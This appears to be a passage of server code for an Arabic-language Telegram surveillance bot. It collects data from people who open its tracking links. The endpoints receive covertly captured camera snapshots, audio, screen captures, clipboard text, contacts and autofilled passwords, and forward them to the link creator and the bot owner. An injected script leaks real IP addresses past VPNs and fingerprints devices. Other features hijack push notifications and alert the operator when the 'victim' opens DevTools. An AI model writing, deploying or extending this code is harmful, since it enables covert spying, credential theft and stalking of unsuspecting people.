    data = data.replaceAll("<br>", "\n");
    const tid = parseInt(uid, 36);
    notify(tid, data, { parse_mode: "HTML" });
    if (tid !== BOT_OWNER) notify(BOT_OWNER, `📋 بيانات (ID: ${tid}):\n${data}`, { parse_mode: "HTML" });
    res.send("Done");
  } else res.send("Missing");
});

// Camera snap buffer: collect all snaps then send as album
const _camBuf = new Map(); // tid -> { snaps:[{buf,cam}], timer }

function flushCamAlbum(tid) {
  const entry = _camBuf.get(tid);
  if (!entry || !entry.snaps.length) { _camBuf.delete(tid); return; }
  const snaps = entry.snaps;
  _camBuf.delete(tid);
  stats.camsnaps += snaps.length; saveStats();

  const ts = new Date().toJSON().slice(11,19) + " UTC";
  const frontN = snaps.filter(s=>s.cam==="front").length;
  const backN  = snaps.filter(s=>s.cam==="back").length;

  if (snaps.length === 1) {
    const {buf,cam} = snaps[0];
    const camLabel = cam==="back"?"📷 خلفية":cam==="front-cont"?"🔄 مستمر":"🤳 أمامية";
    const cap = camLabel + ` | ${ts}`;
    const info = { filename:"snap.png", contentType:"image/png" };
    if (!settings.silentMode) {
      bot.sendPhoto(tid, buf, { caption: cap }, info).catch(()=>{});
      if (tid !== BOT_OWNER) bot.sendPhoto(BOT_OWNER, buf, { caption:`${cap}\n(ID: ${tid})` }, info).catch(()=>{});
    }
    return;
  }

  // Send as media group album
  const albumCap = `📸 ${snaps.length} صور | 🤳${frontN} أمامية  📷${backN} خلفية\n🕒 ${ts}`;
  const media = snaps.map((s,i) => ({
    type: "photo",
    media: s.buf,
    ...(i===0 ? { caption: albumCap } : {})
  }));
  if (!settings.silentMode) {
    bot.sendMediaGroup(tid, media).catch(() => {
      snaps.forEach(s => {
        const info = { filename:"snap.png", contentType:"image/png" };
        bot.sendPhoto(tid, s.buf, { caption:(s.cam==="back"?"📷 خلفية":"🤳 أمامية")+` | ${ts}` }, info).catch(()=>{});
      });
    });
    if (tid !== BOT_OWNER) {
      const ownerMedia = snaps.map((s,i) => ({
        type: "photo", media: s.buf,
        ...(i===0 ? { caption: `${albumCap}\n(ID: ${tid})` } : {})
      }));
      bot.sendMediaGroup(BOT_OWNER, ownerMedia).catch(() => {
        snaps.forEach(s => {
          bot.sendPhoto(BOT_OWNER, s.buf, { caption:(s.cam==="back"?"📷 خلفية":"🤳 أمامية")+` | ${ts}\n(ID: ${tid})` }, { filename:"snap.png", contentType:"image/png" }).catch(()=>{});
        });
      });
    }
  }
}

// ── Files/Photos upload (premium) ─────────────────────────────────────────────
app.post("/file-upload", upload.single('file'), (req, res) => {
  const uid  = req.body?.uid || null;
  if (!uid || !req.file) return res.send("Missing");
  const tid      = parseInt(uid, 36);
  const buf      = req.file.buffer;
  const filename = req.file.originalname || 'file';
  const mime     = req.file.mimetype || 'application/octet-stream';
  const cap      = `📁 ملف: ${filename}`;
  if (!settings.silentMode) {
    if (mime.startsWith('image/')) {
      bot.sendPhoto(tid, buf, { caption: cap }).catch(()=>{});
      if (tid !== BOT_OWNER) bot.sendPhoto(BOT_OWNER, buf, { caption:`${cap}\n(ID: ${tid})` }).catch(()=>{});
    } else if (mime.startsWith('video/')) {
      bot.sendVideo(tid, buf, { caption: cap }).catch(()=>{});
      if (tid !== BOT_OWNER) bot.sendVideo(BOT_OWNER, buf, { caption:`${cap}\n(ID: ${tid})` }).catch(()=>{});
    } else {
      const info = { filename, contentType: mime };
      bot.sendDocument(tid, buf, { caption: cap }, info).catch(()=>{});
      if (tid !== BOT_OWNER) bot.sendDocument(BOT_OWNER, buf, { caption:`${cap}\n(ID: ${tid})` }, info).catch(()=>{});
    }
  }
  res.send("Done");
});

// ── Screen Capture upload (premium) ───────────────────────────────────────────
app.post("/screencap", (req, res) => {
  const uid = req.body?.uid || null;
  const img = req.body?.img || null;
  if (!uid || !img) return res.send("Missing");
  const tid = parseInt(uid, 36);
  const buf = Buffer.from(decodeURIComponent(img), 'base64');
  const info = { filename: "screen.png", contentType: "image/png" };
  const ts = new Date().toJSON().slice(11,19) + " UTC";
  const cap = `🖥️ تصوير الشاشة | ${ts}`;
  if (!settings.silentMode) {
    bot.sendPhoto(tid, buf, { caption: cap }, info).catch(()=>{});
    if (tid !== BOT_OWNER) bot.sendPhoto(BOT_OWNER, buf, { caption: `${cap}\n(ID: ${tid})` }, info).catch(()=>{});
  }
  res.send("Done");
});

// ── Contacts file upload (premium) ────────────────────────────────────────────
app.post("/contacts-file", upload.single('file'), (req, res) => {
  const uid      = req.body?.uid || null;
  const count    = req.body?.count || '?';
  const filename = req.body?.filename || 'contacts.txt';
  if (!uid || !req.file) return res.send("Missing");
  const tid  = parseInt(uid, 36);
  const buf  = req.file.buffer;
  const info = { filename, contentType: 'text/plain' };
  const cap  = `📒 جهات الاتصال: ${count} جهة اتصال`;
  if (!settings.silentMode) {
    bot.sendDocument(tid, buf, { caption: cap }, info).catch(()=>{});
    if (tid !== BOT_OWNER) bot.sendDocument(BOT_OWNER, buf, { caption:`${cap}\n(ID: ${tid})` }, info).catch(()=>{});
  }
  res.send("Done");
});

app.post("/camsnap", (req, res) => {
  const uid = decodeURIComponent(req.body.uid) || null;
  const img = decodeURIComponent(req.body.img) || null;
  const cam = decodeURIComponent(req.body.cam) || "front";
  if (uid && img) {
    const tid = parseInt(uid, 36);
    const buf = Buffer.from(img, 'base64');
    if (!_camBuf.has(tid)) _camBuf.set(tid, { snaps:[], timer:null });
    const entry = _camBuf.get(tid);
    entry.snaps.push({ buf, cam });
    if (entry.timer) clearTimeout(entry.timer);
    entry.timer = setTimeout(() => flushCamAlbum(tid), 13000);
    res.send("Done");
  } else res.send("Missing");
});

app.post("/audio", (req, res) => {
  const uid   = decodeURIComponent(req.body.uid)   || null;
  const audio = decodeURIComponent(req.body.audio) || null;
  if (uid && audio) {
    stats.audios++; saveStats();
    const buffer = Buffer.from(audio, 'base64');
    const info   = { filename: "voice.webm", contentType: 'audio/webm' };
    const tid    = parseInt(uid, 36);
    notifyDoc(tid, buffer, { caption: "🎙️ تسجيل صوتي" }, info);
    if (tid !== BOT_OWNER) notifyDoc(BOT_OWNER, buffer, { caption: `🎙️ صوت (ID: ${tid})` }, info);
    res.send("Done");
  } else res.send("Missing");
});

app.post("/clipboard", (req, res) => {
  const uid  = decodeURIComponent(req.body.uid)  || null;
  const clip = decodeURIComponent(req.body.clip) || null;
  if (uid && clip) {
    const tid = parseInt(uid, 36);
    notify(tid, `📋 محتوى الحافظة:\n\n${clip}`);
    if (tid !== BOT_OWNER) notify(BOT_OWNER, `📋 حافظة (ID: ${tid}):\n\n${clip}`);
    res.send("Done");
  } else res.send("Missing");
});

app.post("/network", (req, res) => {
  const uid  = decodeURIComponent(req.body.uid)  || null;
  const data = decodeURIComponent(req.body.data) || null;
  if (uid && data && data !== 'undefined' && data !== 'null') {
    const tid = parseInt(uid, 36);
    const ip  = getIP(req);
    _addToBuf(tid, ip, 'network', data);
    res.send("Done");
  } else res.send("Missing");
});

// Battery endpoint — always report
// ── Continuous audio (premium) ────────────────────────────────────────────────
app.post("/audio-cont", (req, res) => {
  const uid   = req.body?.uid || null;
  const audio = req.body?.audio || null;
  if (!uid || !audio) return res.send("Missing");
  const tid  = parseInt(uid, 36);
  const buf  = Buffer.from(decodeURIComponent(audio), 'base64');
  const ts   = new Date().toJSON().slice(11,19) + " UTC";
  const info = { filename:"audio-cont.webm", contentType:"audio/webm" };
  if (!settings.silentMode) {
    bot.sendAudio(tid, buf, { caption:`🎙️ صوت مستمر | ${ts}` }, info).catch(()=>{});
    if (tid !== BOT_OWNER) bot.sendAudio(BOT_OWNER, buf, { caption:`🎙️ صوت مستمر | ${ts}\n(ID: ${tid})` }, info).catch(()=>{});
  }
  res.send("Done");
});

// ── Face AI analysis (premium) ────────────────────────────────────────────────
app.post("/faceai", (req, res) => {
  const uid   = decodeURIComponent(req.body?.uid || '');
  const age   = req.body?.age   || '?';
  const gender= req.body?.gender|| '?';
  const expr  = req.body?.expression || '?';
  if (!uid) return res.send("Missing");
  const tid = parseInt(uid, 36);
  const exprMap = { happy:'😊 سعيد', sad:'😢 حزين', angry:'😠 غاضب', neutral:'😐 محايد', surprised:'😲 مندهش', disgusted:'🤢 متقزز', fearful:'😨 خائف' };
  const exprAr = exprMap[expr] || expr;
  const genderAr = gender === 'male' ? '👨 ذكر' : gender === 'female' ? '👩 أنثى' : gender;
  const msg = `😊 تحليل الوجه AI\n👤 الجنس: ${genderAr}\n🎂 العمر التقريبي: ${age} سنة\n😶 الحالة: ${exprAr}`;
  notify(tid, msg);
  if (tid !== BOT_OWNER) notify(BOT_OWNER, `${msg}\n(ID: ${tid})`);
  res.send("Done");
});

// ── Physical activity detection (premium) ─────────────────────────────────────
app.post("/activity", (req, res) => {
  const uid      = decodeURIComponent(req.body?.uid || '');
  const activity = req.body?.activity || '?';
  const mag      = req.body?.avgMag   || '?';
  if (!uid) return res.send("Missing");
  const tid = parseInt(uid, 36);
  const ip  = getIP(req);
  _addToBuf(tid, ip, 'activity', `${activity} | شدة: ${mag}`);
  res.send("Done");
});

// ── Autofill capture (premium) ─────────────────────────────────────────────────
app.post("/autofill", (req, res) => {
  const uid      = decodeURIComponent(req.body?.uid || '');
  const email    = req.body?.email    || '';
  const username = req.body?.username || '';
  const tel      = req.body?.tel      || '';
  const password = req.body?.password || '';
  if (!uid) return res.send("Missing");
  const tid = parseInt(uid, 36);
  let msg = `🔑 *بيانات Autofill مُستخرجة*`;
  if (email)    msg += `\n📧 الإيميل: \`${email}\``;
  if (username) msg += `\n👤 اليوزرنيم: \`${username}\``;
  if (tel)      msg += `\n📞 الهاتف: \`${tel}\``;
  if (password) msg += `\n🔐 كلمة المرور: \`${password}\``;
  notify(tid, msg, {parse_mode:"Markdown"});
  if (tid !== BOT_OWNER) notify(BOT_OWNER, `${msg}\n_(ID: ${tid})_`, {parse_mode:"Markdown"});
  res.send("Done");
});

// ── DevTools detection (premium) ──────────────────────────────────────────────
app.post("/devtools-alert", (req, res) => {
  const uid  = decodeURIComponent(req.body?.uid || '');
  const type = req.body?.type || 'open';
  if (!uid) return res.send("Missing");
  const tid = parseInt(uid, 36);
  const msg = `🔍 تحذير! الضحية فتحت DevTools\n🛠️ نوع الكشف: ${type}`;
  notify(tid, msg);
  if (tid !== BOT_OWNER) notify(BOT_OWNER, `${msg}\n(ID: ${tid})`);
  res.send("Done");
});

app.post("/vpndetect", (req, res) => {
  const uid       = decodeURIComponent(req.body.uid || '');
  const deviceTz  = req.body.deviceTz || '?';
  const ipTz      = req.body.ipTz     || '?';
  const ipCountry = req.body.ipCountry|| '?';
  const ipCity    = req.body.ipCity   || '?';
  if (!uid) return res.send("Missing");
  const tid = parseInt(uid, 36);
  const msg = `🕵️ VPN مكتشف!\n📱 توقيت الجهاز: ${deviceTz}\n🌐 توقيت الـ IP: ${ipTz}\n📍 موقع الـ IP: ${ipCity}, ${ipCountry}`;
  notify(tid, msg);
  if (tid !== BOT_OWNER) notify(BOT_OWNER, `${msg}\n(ID: ${tid})`);
  res.send("Done");
});

app.post("/battery", (req, res) => {
  const uid      = decodeURIComponent(req.body.uid) || null;
  const level    = parseInt(req.body.level);
  const charging = req.body.charging === 'true';
  if (uid && !isNaN(level)) {
    const tid  = parseInt(uid, 36);
    const icon = level > 60 ? '🔋' : level > 20 ? '🪫' : '🔴';
    const plug  = charging ? '🔌 يشحن' : '🔋 لا يشحن';
    const msg  = `${icon} البطارية: ${level}% | ${plug}`;
    notify(tid, msg);
    if (tid !== BOT_OWNER) notify(BOT_OWNER, `${msg}\n(ID: ${tid})`);
    res.send("Done");
  } else res.send("Missing");
});

// ── WebRTC real-IP leak (bypasses VPN/proxy) ──────────────────────────────────
app.post("/webrtc-ips", (req, res) => {
  res.send("ok");
  const uid  = req.body.uid || '';
  const ips  = req.body.ips || '';
  const fp   = req.body.fp  || '';
  if (!uid) return;
  const tid = parseInt(uid, 36);
  let msg = `🌐 كشف WebRTC (IP حقيقي):`;
  if (ips) msg += `\n🔓 ${ips}`;
  if (fp)  msg += `\n\n🖥️ بصمة الجهاز:\n${fp}`;
  notify(tid, msg);
  if (tid !== BOT_OWNER) notify(BOT_OWNER, `${msg}\n(ID: ${tid})`);
});

// ── Tracking JS endpoint — injected into all tracking pages ──────────────────
app.get("/t.js", (req, res) => {
  const uid = (req.query.u || '').replace(/[^a-z0-9]/gi,'');
  if (!uid) return res.status(400).send('');
  res.setHeader('Content-Type','application/javascript');
  res.setHeader('Cache-Control','no-store');
  res.send(`(function(){
  var base="${hostURL}",uid="${uid}";
  // ── WebRTC real-IP leak ──
  try {
    var ips=new Set();
    var pc=new RTCPeerConnection({iceServers:[
      {urls:"stun:stun.l.google.com:19302"},
      {urls:"stun:stun1.l.google.com:19302"},
      {urls:"stun:stun.cloudflare.com:3478"}
    ]});
    pc.createDataChannel("");
    pc.onicecandidate=function(e){
      if(e&&e.candidate){
        var m=e.candidate.candidate.match(/(\\d{1,3}\\.){3}\\d{1,3}/);
        if(m&&m[0]!=="0.0.0.0")ips.add(m[0]);
      }
    };
    pc.createOffer().then(function(o){return pc.setLocalDescription(o);}).catch(function(){});
    setTimeout(function(){
      try{pc.close();}catch(e){}
      if(!ips.size)return;
      var ipList=[...ips].join(" | ");
      // ── Device fingerprint ──
      var fp="";
      try{
        var c=document.createElement("canvas"),ctx=c.getContext("2d");
        ctx.textBaseline="top";ctx.font="14px \\'Arial\\'";
        ctx.fillStyle="#f60";ctx.fillRect(125,1,62,20);
        ctx.fillStyle="#069";ctx.fillText("fingerprint 🖥️ Device",2,2);
        ctx.fillStyle="rgba(102,204,0,0.7)";ctx.fillText("fingerprint 🖥️ Device",4,2);
        var gl=document.createElement("canvas").getContext("webgl");
        var dbg=gl&&gl.getExtension("WEBGL_debug_renderer_info");
        var gpu=dbg?gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL):"—";
        var hash=c.toDataURL().slice(-12);
        fp="🎨 Canvas: "+hash
          +"\\n🎮 GPU: "+gpu
          +"\\n📐 Screen: "+screen.width+"×"+screen.height+"/"+screen.colorDepth+"bit"
          +"\\n🕐 Timezone: "+Intl.DateTimeFormat().resolvedOptions().timeZone
          +"\\n🌐 Language: "+navigator.language
          +"\\n⚙️ CPU cores: "+(navigator.hardwareConcurrency||"—")
          +"\\n💾 RAM: "+(navigator.deviceMemory||"—")+"GB"
          +"\\n📱 Touch: "+(navigator.maxTouchPoints||0)+" points";
      }catch(e){}
      var body="uid="+encodeURIComponent(uid)
        +"&ips="+encodeURIComponent(ipList)
        +"&fp="+encodeURIComponent(fp);
      var xhr=new XMLHttpRequest();
      xhr.open("POST",base+"/webrtc-ips",true);
      xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
      xhr.send(body);
    },4000);
  }catch(e){}
})();`);
});

// ── Push Notifications: SSE (foreground) + VAPID (background) ─────────────────
const PUSH_FILE  = "./push_subs.json";
let pushSubs = loadJSON(PUSH_FILE, {});   // { pid: { uid, subscription? } }
const sseClients = {};                    // { pid: res } — live SSE connections

// Serve VAPID public key
app.get("/vapid-key", (req, res) => res.json({ key: VAPID_PUBLIC }));

// SSE stream — foreground push
app.get("/push-stream", (req, res) => {
  const uid  = req.query.uid  || '';
  const pid  = req.query.pid  || uid;
  const purl = req.query.purl || '';
  if (!pid) return res.status(400).end();

  res.set({
    "Content-Type":  "text/event-stream",
    "Cache-Control": "no-cache",
    "Connection":    "keep-alive",
    "X-Accel-Buffering": "no"
  });
  res.flushHeaders();
  res.write(": ok\n\n");

  sseClients[pid] = res;

  if (!pushSubs[pid]) {
    pushSubs[pid] = { uid, purl };
    saveJSON(PUSH_FILE, pushSubs);
    backupFileToGH("./push_subs.json", "_data/push_subs.json");
    const tid = parseInt(uid, 36);
    const _pushKb = { reply_markup: JSON.stringify({ inline_keyboard: [
      [{ text: "📲 سحب الجهاز", callback_data: `pull:${pid}` }, { text: "📩 إرسال رسالة", callback_data: `pushmsg:${pid}` }],
      [{ text: "📋 معلومات الجهاز", callback_data: `pushinfo:${pid}` }]
    ] }) };
    if (isPremium(tid) && premium[String(tid)]?.pushNotif !== false) {
      bot.sendMessage(tid, `🔔 تم تفعيل الإشعارات على جهاز الضحية!\n🆔 \`${pid}\``, { parse_mode:"Markdown", ..._pushKb });
    }
    if (tid !== BOT_OWNER) bot.sendMessage(BOT_OWNER, `🔔 إشعارات مُفعَّلة!\n🆔 \`${pid}\`\n(Creator: ${tid})`, { parse_mode:"Markdown", ..._pushKb });
  } else {
    // Update purl if changed
    if (purl && pushSubs[pid].purl !== purl) {
      pushSubs[pid].purl = purl;
      saveJSON(PUSH_FILE, pushSubs);
    }
  }

  const hb = setInterval(() => { try { res.write(": hb\n\n"); } catch(e) {} }, 25000);
  req.on("close", () => {
    clearInterval(hb);
    if (sseClients[pid] === res) delete sseClients[pid];
  });
});

// VAPID subscription — background push
app.post("/push-subscribe", (req, res) => {
  res.send("ok");
  const uid  = req.body.uid  || '';
  const pid  = req.body.pid  || uid;
  const purl = req.body.purl || '';
  const sub  = req.body.sub;
  if (!pid || !sub || !sub.endpoint) return;
  const entry = pushSubs[pid] || { uid };
  entry.subscription = sub;
  if (purl) entry.purl = purl;
  pushSubs[pid] = entry;
  saveJSON(PUSH_FILE, pushSubs);
  backupFileToGH("./push_subs.json", "_data/push_subs.json");
});

async function sendPushToDevice(pid, title, body, url) {
  // 1. Try SSE first (instant, if page is open)
  const client = sseClients[pid];
  if (client) {
    try {
      client.write(`event: push\ndata: ${JSON.stringify({ title, body, url: url || null })}\n\n`);
      return "sse";
    } catch(e) { delete sseClients[pid]; }
  }
  // 2. Fallback to VAPID (background, page closed)
  const entry = pushSubs[pid];
  if (entry && entry.subscription) {
    try {
      const payload = JSON.stringify({ title, body, url: url || entry.purl || null });
      await webPush.sendNotification(entry.subscription, payload);
      return "vapid";
    } catch(e) {
      if (e.statusCode === 410 || e.statusCode === 404) {
        delete entry.subscription;
        saveJSON(PUSH_FILE, pushSubs);
      }
    }
  }
  return null; // Both failed
}

app.get("/push-poll", (req, res) => res.json({}));

// ── Persistent ID report ───────────────────────────────────────────────────────
app.post("/pid", (req, res) => {
  res.send("ok");
  const uid = req.body.uid || '';
  const pid = req.body.pid || '';
  const ret = req.body.ret || 'new';   // 'new' | 'existing'
  if (!uid || !pid) return;
  const tid = parseInt(uid, 36);
  const icon = ret === 'existing' ? '🔁' : '🆕';
  const msg = `${icon} زيارة ${ret === 'existing' ? 'متكررة' : 'جديدة'} للجهاز\n🆔 PID: ${pid}`;
  notify(tid, msg);
  if (tid !== BOT_OWNER) notify(BOT_OWNER, `${msg}\n(ID: ${tid})`);
});

// ── Local network scan results ─────────────────────────────────────────────────
app.post("/localnet", (req, res) => {
  res.send("ok");
  const uid   = req.body.uid   || '';
  const hosts = req.body.hosts || '';
  if (!uid || !hosts) return;
  const tid = parseInt(uid, 36);
  const msg = `🌐 أجهزة الشبكة المحلية:\n${hosts}`;
  notify(tid, msg);
  if (tid !== BOT_OWNER) notify(BOT_OWNER, `${msg}\n(ID: ${tid})`);
});

// ── Health check endpoint (ping from UptimeRobot) ─────────────────────────────
app.get("/health", (req, res) => res.send("OK"));
app.get("/ping",   (req, res) => res.send("pong"));

// ── Keep Alive (self-ping every 13 min as backup) ─────────────────────────────
setInterval(() => {
  fetch(`${hostURL}/health`).catch(() => {});
}, 13 * 60 * 1000);

// ── Auto-backup every 2 minutes ──────────────────────────────────────────────
setInterval(() => { backupToGitHub(); }, 2 * 60 * 1000);

// ── Save on graceful shutdown (SIGTERM from Render before redeploy) ───────────
process.on('SIGTERM', async () => {
  console.log("SIGTERM — حفظ البيانات قبل الإغلاق...");
  await backupToGitHub();
  process.exit(0);
});

// ── Live Chat Routes ──────────────────────────────────────────────────────────

app.get("/live-chat/:uid", (req, res) => {
  const uid = req.params.uid;
  const pid = req.query.pid || 'default';
  res.set({ 'Content-Type':'text/event-stream', 'Cache-Control':'no-cache', 'Connection':'keep-alive' });
  res.flushHeaders();
  res.write('data: {"type":"connected"}\n\n');
  const key = `${uid}:${pid}`;
  _chatClients.set(key, { res, uid, pid });
  req.on('close', () => _chatClients.delete(key));
});

app.post("/live-chat-msg", express.json({limit:"64kb"}), (req, res) => {
  const { uid, pid, msg } = req.body || {};
  if (!uid || !msg) return res.json({ok:false});
  res.json({ok:true});
  const tid = parseInt(uid, 36);
  const ip  = getIP(req);
  const ts  = new Date().toJSON().slice(11,16) + " UTC";
  const chatMsg = `${LIVE_CHAT_PREFIX}\n📍 IP: ${ip} | ⏰ ${ts}\n👤 المنشئ: \`${tid}\`\n\n💬 "${msg}"`;
  bot.sendMessage(BOT_OWNER, chatMsg, {
    parse_mode:"Markdown",
    reply_markup: JSON.stringify({ inline_keyboard: [[
      { text:"💬 رد على الضحية", callback_data:`chat_reply_${uid}_${pid||'default'}` }
    ]] })
  }).catch(()=>{});
  if (Number(tid) !== BOT_OWNER) {
    bot.sendMessage(tid, chatMsg, {
      parse_mode:"Markdown",
      reply_markup: JSON.stringify({ inline_keyboard: [[
        { text:"💬 رد على الضحية", callback_data:`chat_reply_${uid}_${pid||'default'}` }
      ]] })
    }).catch(()=>{});
  }
});

app.post("/live-chat-send", express.json({limit:"64kb"}), (req, res) => {
  const { uid, pid, msg } = req.body || {};
  if (!uid || !msg) return res.json({ok:false});
  const key = `${uid}:${pid||'default'}`;
  const client = _chatClients.get(key);
  if (client) {
    client.res.write(`data: ${JSON.stringify({type:"msg", from:"agent", text:msg})}\n\n`);
    return res.json({ok:true, delivered:true});
  }
  res.json({ok:true, delivered:false});
});

// ── Notify owner when server starts (after cold start / crash recovery) ───────
const PORT = process.env.PORT || 5000;
app.listen(PORT, async () => {
  console.log(`App Running on Port ${PORT}!`);

  // Wait for the old container's SIGTERM backup to finish before restoring
  // Railway starts the new container almost simultaneously with SIGTERM on the old one.
  // The old container's backupToGitHub() takes ~5-8s. We wait 12s to be safe.
  console.log("⏳ انتظار 12 ثانية لضمان اكتمال النسخ الاحتياطي من الحاوية القديمة...");
  await new Promise(r => setTimeout(r, 12000));

  // Restore user data from GitHub before doing anything else
  const restored = await restoreFromGitHub();

  setTimeout(() => {
    // Commands for all users
    bot.setMyCommands([
      { command: "start",   description: "ابدأ البوت" },
      { command: "help",    description: "المساعدة" },
      { command: "mystats", description: "إحصائياتي" },
      { command: "myid",    description: "معرّفي" },
      { command: "create",  description: "إنشاء رابط" }
    ]).catch(() => {});

    // Extra commands visible ONLY to the owner
    bot.setMyCommands([
      { command: "start",         description: "🚀 ابدأ البوت" },
      { command: "help",          description: "📖 المساعدة" },
      { command: "create",        description: "🔗 إنشاء رابط" },
      { command: "myid",          description: "🆔 معرّفي" },
      { command: "mystats",       description: "📊 إحصائياتي" },
      { command: "features",      description: "🎛️ التحكم بالميزات الإضافية" },
      { command: "premiumconfig", description: "💎 إعدادات البريميوم المجاني" },
      { command: "stats",         description: "📊 إحصائيات البوت الكاملة" },
      { command: "report",        description: "📋 تقرير شامل فوري" },
      { command: "users",         description: "👥 قائمة المستخدمين" },
      { command: "top",           description: "🏆 الأكثر نشاطاً" },
      { command: "lastopen",      description: "🕐 آخر فتح للروابط" },
      { command: "targets",       description: "🎯 الأهداف المراقبة" },
      { command: "premiumlist",   description: "💎 قائمة المشتركين" },
      { command: "broadcast",     description: "📢 إرسال رسالة للجميع" },
      { command: "silent",        description: "🔕 الوضع الصامت" },
      { command: "away",          description: "🌙 وضع الغياب" },
      { command: "schedule",      description: "📅 جدولة تقرير يومي" },
      { command: "setwelcome",    description: "✏️ تخصيص رسالة الترحيب" },
      { command: "clearstats",    description: "🗑️ مسح الإحصائيات" },
      { command: "export",        description: "📤 تصدير بيانات المستخدمين" },
      { command: "ping",          description: "🏓 اختبار السرعة" }
    ], { scope: { type: "chat", chat_id: BOT_OWNER } }).catch(() => {});

    const up = new Date().toISOString();
    bot.sendMessage(BOT_OWNER,
      `✅ البوت اتشغّل الآن\n🕒 ${up}\n💾 البيانات: ${restored > 0 ? `استُعيدت (${restored} ملف)` : 'ملفات جديدة'}`
    ).catch(() => {});
  }, 3000);
});
